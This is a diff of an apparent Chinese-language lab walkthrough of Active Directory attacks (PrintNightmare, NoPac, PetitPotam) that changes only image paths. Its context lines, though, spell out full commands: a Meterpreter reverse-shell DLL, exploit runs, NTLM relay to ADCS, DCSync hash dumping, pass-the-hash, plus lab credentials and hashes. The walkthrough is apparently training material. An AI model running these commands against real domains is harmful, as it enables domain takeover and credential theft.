@@ -70,35 +70,35 @@ PrintNightmare包括两项漏洞CVE-2021-34527 和 CVE-2021-1675，这些漏洞�
 > rpcdump.py @IP | egrep 'MS-RPRN|MS-PAR'  
   
   
-![1744597137_67fc7091ed9e7cd02f35b.png!small?1744597138738](https://mmbiz.qpic.cn/mmbiz_jpg/5975bXHXfWElmicQfyttQ4ULfUdkaNe9BMhrJJ1697Bg0EoFaIWMwChQibrJMjWEA1FUF6bxG6HBw0JItoOT2Dbw/640?wx_fmt=jpeg&from=appmsg "")  
+![1744597137_67fc7091ed9e7cd02f35b.png!small?1744597138738](../../.resource/remote/71b861c64512bc1542a9741ca3eb839f341d64bca3f91d70cbd30d5f632e338a.jpg "")  
 ### 生成DLL payload  
   
 在确认后，生成一个DLL利用：  
 > msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll  
   
   
-![1744597202_67fc70d2630b5a4b81d49.png!small?1744597212841](https://mmbiz.qpic.cn/mmbiz_jpg/5975bXHXfWElmicQfyttQ4ULfUdkaNe9BnHY3hwmFYjCTNdxFYz7cJFBPl3kBrLA1LzYTqDjibVNVgT6D8uPfwvQ/640?wx_fmt=jpeg&from=appmsg "")  
+![1744597202_67fc70d2630b5a4b81d49.png!small?1744597212841](../../.resource/remote/e061e6c6b9a7b859dc4330fb1f46dcff52124a7c5a0e2a3a1b5c3c488f79e832.jpg "")  
 ### 使用MSF multi/handler  
   
 准备接受shell  
   
-![1744596535_67fc6e37cef6da798e857.png!small?1744596536762](https://mmbiz.qpic.cn/mmbiz_jpg/5975bXHXfWElmicQfyttQ4ULfUdkaNe9BPHO6ZYe6gZG9CapYpsnhyukgzvrORzcxaxJgUlPzSm6Awj8qrnGBXQ/640?wx_fmt=jpeg&from=appmsg "")  
+![1744596535_67fc6e37cef6da798e857.png!small?1744596536762](../../.resource/remote/bfb4aebaeb7965e67ba4041cd10b2ed1eb79ea4694f155ee3c7d74b4bb3a1832.jpg "")  
 ### 创建smb共享  
 > sudo smbserver.py -smb2support CompData /home/htb-student/CompData/  
   
   
-![1744596644_67fc6ea4babe2b65ca1a8.png!small?1744596645661](https://mmbiz.qpic.cn/mmbiz_jpg/5975bXHXfWElmicQfyttQ4ULfUdkaNe9Bv6OCJPwx7AK1YnNfNw5AfpXHlo9cLjrDApYYUiciaAplozpLotZ6wZwQ/640?wx_fmt=jpeg&from=appmsg "")  
+![1744596644_67fc6ea4babe2b65ca1a8.png!small?1744596645661](../../.resource/remote/8f0ee7f5ee275344cc041c48cbec965cdf6bbf921c9323d12b72bb1ac3a5423f.jpg "")  
 ### 漏洞利用  
   
 一切准备就绪，利用漏洞  
 > sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'  
   
   
-![1744596697_67fc6ed906e22e6621ca6.png!small?1744596697899](https://mmbiz.qpic.cn/mmbiz_jpg/5975bXHXfWElmicQfyttQ4ULfUdkaNe9BjZPDHVnnFxxATaCwbwaaDGm8tbEOjg1wyAC2szrsHy3ibvJgs4nTibew/640?wx_fmt=jpeg&from=appmsg "")  
+![1744596697_67fc6ed906e22e6621ca6.png!small?1744596697899](../../.resource/remote/54ddb083fc9a8a248411f208bc136f8d6c83d6c99ca00b3f6bd7dec45f3c2828.jpg "")  
   
 查看发现拿到Meterpreter shell，已经是高权限。  
   
-![1744596725_67fc6ef582c02eae665c4.png!small?1744596727003](https://mmbiz.qpic.cn/mmbiz_jpg/5975bXHXfWElmicQfyttQ4ULfUdkaNe9BSJtXDU2cpQnWLyqlfCDQIcdyeia8Mh91iaFzFNB9xg5c8vGCYPB0dUOQ/640?wx_fmt=jpeg&from=appmsg "")  
+![1744596725_67fc6ef582c02eae665c4.png!small?1744596727003](../../.resource/remote/fa6112a5c98a5bc973ee57fa96b3a9af522bdc5f970627588fd77ba642b8c246.jpg "")  
 ## NoPac  
   
 **NoPac**  
@@ -114,7 +114,7 @@ noPac利用工具
 > python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap  
   
   
-![1744871335_68009fa760cd0b8497b18.png!small?1744871335943](https://mmbiz.qpic.cn/mmbiz_jpg/5975bXHXfWElmicQfyttQ4ULfUdkaNe9B3VkctGP70TiagNmydSJO1eW1EcJLc3NTbrpvVia0ib9qEeUiaeib1UKicy2w/640?wx_fmt=jpeg&from=appmsg "")  
+![1744871335_68009fa760cd0b8497b18.png!small?1744871335943](../../.resource/remote/33ad07bf1293a8c3f4ed92c59626bcc7d0205d33fb7f9076d41a2efeab3e30e0.jpg "")  
   
 在成功获取TGT之后，表明确实存在漏洞，还可以发现**ms-DS-MachineAccountQuota**  
 的值被设置为**10**  
@@ -125,12 +125,12 @@ noPac利用工具
 > sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap  
   
   
-![1744871640_6800a0d8d2f9ed67b3a22.png!small?1744871641616](https://mmbiz.qpic.cn/mmbiz_jpg/5975bXHXfWElmicQfyttQ4ULfUdkaNe9BmHx6YicPPL54ibhj5Uib5W3Jib0Mk2Uxwpo2GxehjzGkb3sXPn9afJCicvA/640?wx_fmt=jpeg&from=appmsg "")  
+![1744871640_6800a0d8d2f9ed67b3a22.png!small?1744871641616](../../.resource/remote/cb74a7e8fb449f6e3f0019ec071a026b6bfb5b51196c6602802ab4f8d7fa7258.jpg "")  
 ### Dump hash  
   
 sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator  
   
-![1744871883_6800a1cbe4948736766b2.png!small?1744871884503](https://mmbiz.qpic.cn/mmbiz_jpg/5975bXHXfWElmicQfyttQ4ULfUdkaNe9BNHxSbRL3WRs82ODPmHHUMLsSUsSzrzab79Dmtzffm5IUicB40mQuFqA/640?wx_fmt=jpeg&from=appmsg "")  
+![1744871883_6800a1cbe4948736766b2.png!small?1744871884503](../../.resource/remote/4d4d6754308eaed0a5fbf48e96f8d8c577d375180910d9f85cce09bb7d924dab.jpg "")  
   
 导出了administrator的NTML。  
 ## PetitPotam  
@@ -144,25 +144,25 @@ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -d
 > sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController  
   
   
-![1744803345_67ff9611265f430e13f76.png!small?1744803345705](https://mmbiz.qpic.cn/mmbiz_jpg/5975bXHXfWElmicQfyttQ4ULfUdkaNe9BvBPgO9ia1eadA51fKqTkib0tl4K3e1gP2ecsmA7NYZYJsHLugr6bXrLg/640?wx_fmt=jpeg&from=appmsg "")  
+![1744803345_67ff9611265f430e13f76.png!small?1744803345705](../../.resource/remote/d5c4dd782ea0bbb3afd498f59b804ec856138761e51cb1fbd5ff6aa30e0ba20b.jpg "")  
 ### 攻击步骤2  
   
 在另一个窗口中，我们可以运行工具PetitPotam.py。尝试强制域控制器向运行 ntlmrelayx.py 的主机进行身份验证。  
 > python3 PetitPotam.py 172.16.5.225 172.16.5.5  
   
   
-![1744803565_67ff96ed53fec4ed68f55.png!small?1744803565982](https://mmbiz.qpic.cn/mmbiz_jpg/5975bXHXfWElmicQfyttQ4ULfUdkaNe9BzKsZxp0AWTOGlA2mlwYP3KNVm958gxfTonCFjQUtLJFnXFCe9meXrA/640?wx_fmt=jpeg&from=appmsg "")  
+![1744803565_67ff96ed53fec4ed68f55.png!small?1744803565982](../../.resource/remote/959827edef2ad7a3a36e556131776f39090a3b3806c6f868f42f559c26d10161.jpg "")  
   
 如果攻击成功，可以看到成功的登录请求并获取域控制器的base64编码证书。  
   
-![1744803610_67ff971a6dea80932e6de.png!small](https://mmbiz.qpic.cn/mmbiz_jpg/5975bXHXfWElmicQfyttQ4ULfUdkaNe9BiaAzfKoia00JkibveCWmpIBCxH16eRria64uDicicp9IMOudzFwaAHGE3dFw/640?wx_fmt=jpeg&from=appmsg "")  
+![1744803610_67ff971a6dea80932e6de.png!small](../../.resource/remote/e940d18174b92cd052a4c97b1a66b1ef44b1940c3583bc0074b541004ced9ea8.jpg "")  
 ### 攻击步骤3  
   
 接下来，我们可以获取此base64 证书并用使用gettgtpkinit.py来为域控制器请求票证授予票证(TGT)。  
 > python3 gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 <获取的编码> dc01.ccache  
   
   
-![1744809426_67ffadd2c04abe5ff83d0.png!small](https://mmbiz.qpic.cn/mmbiz_jpg/5975bXHXfWElmicQfyttQ4ULfUdkaNe9BX8F1kAoiaLE4OQxtbwOicI5o9jNxgY2adEWP9V4Lo51edjpbjib8caObA/640?wx_fmt=jpeg&from=appmsg "")  
+![1744809426_67ffadd2c04abe5ff83d0.png!small](../../.resource/remote/cc71daf26f1fe3ae3c1e0f1de2e80f95cb9a26ae18466d69ea0cd89a4a88d4e0.jpg "")  
 > AS-REP 加密密钥：16950e24794e18ce18211c5ebf8ea22910b3854ffb9ce4c4ab0dcc8a5c390abe  
   
   
@@ -175,21 +175,21 @@ TGT票据保存到了本地dc01.ccache 文件中。
   
 可以使用klist查看票据  
   
-![1744809546_67ffae4a854b26f33dd1b.png!small?1744809547199](https://mmbiz.qpic.cn/mmbiz_jpg/5975bXHXfWElmicQfyttQ4ULfUdkaNe9BFOeYjdhSwDic6eeHzaOfU33Q5PUFiazvFiaGYnK69neDZbpBP14oTwAhA/640?wx_fmt=jpeg&from=appmsg "")  
+![1744809546_67ffae4a854b26f33dd1b.png!small?1744809547199](../../.resource/remote/d2437de50af7eb1ed4330cc272ad30ea89406570b6c93dcf1fce32c5584e7b3c.jpg "")  
 ### 攻击步骤5  
   
 然后，我们可以将此TGT与 secretsdump.py 结合使用，执行 DCSync。  
 > secretsdump.py -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL  
   
   
-![1744806129_67ffa0f1af8e0ef8a930d.png!small?1744806130520](https://mmbiz.qpic.cn/mmbiz_jpg/5975bXHXfWElmicQfyttQ4ULfUdkaNe9BfBTISbfqUo2qrdmmhQdLtr7SH46xPdYTCOiaZnMsickibqMXpvYmPMSrg/640?wx_fmt=jpeg&from=appmsg "")  
+![1744806129_67ffa0f1af8e0ef8a930d.png!small?1744806130520](../../.resource/remote/ba0b88366ce445e084bee30ad001d42f675ca19abdb0f0a83b28dfb74ef5839a.jpg "")  
 ### 攻击步骤6  
   
 使用内置管理员帐户的 NTLM哈希来向域控制器进行身份验证。后续可以拿到shell。  
 > crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf  
   
   
-![1744806569_67ffa2a9aa1b49e906a90.png!small?1744806570152](https://mmbiz.qpic.cn/mmbiz_jpg/5975bXHXfWElmicQfyttQ4ULfUdkaNe9BtWqmLWw34DRTVxvKnlRWaPqaGeY8lXzKA5KY2KYWTU1xiaa8qPJr6xA/640?wx_fmt=jpeg&from=appmsg "")  
+![1744806569_67ffa2a9aa1b49e906a90.png!small?1744806570152](../../.resource/remote/225b70ccb35a9efdc9d0b88012b01c733f760cd93ffbb2b35bababe2bf424b9e.jpg "")  
 ### 方法2  
   
 在这里获取目标的 TGT之后，可以采取另一种方法来请求目标主机或用户的NTLM哈希。  
@@ -202,7 +202,7 @@ TGT票据保存到了本地dc01.ccache 文件中。
 > python /opt/PKINITtools/getnthash.py -key 16950e24794e18ce18211c5ebf8ea22910b3854ffb9ce4c4ab0dcc8a5c390abe INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$  
   
   
-![1744809629_67ffae9d0c564d1520b31.png!small?1744809630146](https://mmbiz.qpic.cn/mmbiz_jpg/5975bXHXfWElmicQfyttQ4ULfUdkaNe9BQDrRAxQHAMwRF6EYbJKaxFODaw8jo5fAGfMG6bOruOvYSw5vw7bXDA/640?wx_fmt=jpeg&from=appmsg "")  
+![1744809629_67ffae9d0c564d1520b31.png!small?1744809630146](../../.resource/remote/5aedf6c725ee31570b1a038240578c98482fcf0aa135bc5c5c422c231849eb5b.jpg "")  
 ### 步骤2.2  
   
 然后，我们可以用这个哈希值,使用secretsdump.py**-hashes**  
@@ -211,7 +211,7 @@ TGT票据保存到了本地dc01.ccache 文件中。
 > secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:7277f699a390220114d3571785d5d02d  
   
   
-![1744810419_67ffb1b32faa0118c3de7.png!small?1744810420059](https://mmbiz.qpic.cn/mmbiz_jpg/5975bXHXfWElmicQfyttQ4ULfUdkaNe9BicO1kgyPk0KsUV8ouG3fWQf0sFxLicovH3RBeu3IiaWrR8bvibhT3fuEFQ/640?wx_fmt=jpeg&from=appmsg "")  
+![1744810419_67ffb1b32faa0118c3de7.png!small?1744810420059](../../.resource/remote/a9c6c3949e62bdad299cdfd753a555319bd10ae55e14b85e6df97f4bba6d78d1.jpg "")  
   
 一样可以导出目标NTLM哈希  
 ### 方法三Pass-the-Ticket (PTT)   
@@ -222,7 +222,7 @@ TGT票据保存到了本地dc01.ccache 文件中。
 > .\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:<base64编码> /ptt  
   
   
-![1744810601_67ffb269e5c74e243db27.png!small?1744810602547](https://mmbiz.qpic.cn/mmbiz_jpg/5975bXHXfWElmicQfyttQ4ULfUdkaNe9BHDhzaUpdQ2RnNLXfbwaHVfI2cpcZ1x1ApTETragjrL2u3hjPzFEtkg/640?wx_fmt=jpeg&from=appmsg "")  
+![1744810601_67ffb269e5c74e243db27.png!small?1744810602547](../../.resource/remote/f1f592b21d4b5cf69e353a97d5f11f1cc34a354366f7a630d62a1e80c7ddaf48.jpg "")  
   
 然后，我们可以通过**klist**  
 来确认票据是否在内存中。同样的，可以使用 Mimikatz 执行 DCSync 攻击。在这里，我们获取krbtgt帐户的NTLM哈希。  
@@ -230,7 +230,7 @@ TGT票据保存到了本地dc01.ccache 文件中。
 > lsadump::dcsync /user:inlanefreight\krbtgt  
   
   
-![1744810851_67ffb36347ab5f91b73d5.png!small?1744810851780](https://mmbiz.qpic.cn/mmbiz_jpg/5975bXHXfWElmicQfyttQ4ULfUdkaNe9BK9AX19FjrZ4NzCZ01hibKl1GGsOVzmAibyV8YKCV6v2grOvMuicgkn72Q/640?wx_fmt=jpeg&from=appmsg "")  
+![1744810851_67ffb36347ab5f91b73d5.png!small?1744810851780](../../.resource/remote/12df4e99603d3904d831f020346ac8ab653fcd2eba8d1e11e7dc5a3bb0ca72fe.jpg "")  
   
   
   
